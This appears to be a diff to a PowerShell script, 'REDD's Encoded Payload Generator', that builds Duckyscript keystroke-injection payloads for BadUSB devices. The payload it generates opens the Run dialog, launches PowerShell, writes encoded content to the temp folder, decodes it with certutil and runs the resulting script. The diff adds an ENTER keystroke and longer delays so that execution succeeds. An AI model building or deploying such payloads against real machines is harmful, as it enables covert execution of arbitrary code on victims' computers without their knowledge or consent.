@@ -1,7 +1,7 @@
 # Title: REDD's Encoded Payload Generator
 # Description: Creates a encrypted Payload for BadUSB/Duckyscript Devices.
 # AUTHOR: InfoSecREDD
-# Version: 1.4.1
+# Version: 1.4.2
 $path = split-path -parent $MyInvocation.MyCommand.Definition
 $script = $MyInvocation.MyCommand.Name
 $payload_filename = "payload.txt"
@@ -75,7 +75,9 @@ else
 "GUI r" | Out-File -FilePath "$payload_file" -Append
 "DELAY 200" | Out-File -FilePath "$payload_file" -Append
 "STRING powershell" | Out-File -FilePath "$payload_file" -Append
-"DELAY 200" | Out-File -FilePath "$payload_file" -Append
+"DELAY 500" | Out-File -FilePath "$payload_file" -Append
+"ENTER" | Out-File -FilePath "$payload_file" -Append
+"DELAY 500" | Out-File -FilePath "$payload_file" -Append
 "STRING `$TempFile = `"`$env:TEMP\temp.ps1`"; `$File = `"`$env:TEMP\l.ps1`"; echo $output`> `"`$TempFile`"; certutil -f -decode `"`$TempFile`" `"`$File`" `| out-null`; `& `"`$env:TEMP\l.ps1`"" | Out-File -FilePath "$payload_file" -Append
 "DELAY 1000" | Out-File -FilePath "$payload_file" -Append
 "ENTER" | Out-File -FilePath "$payload_file" -Append
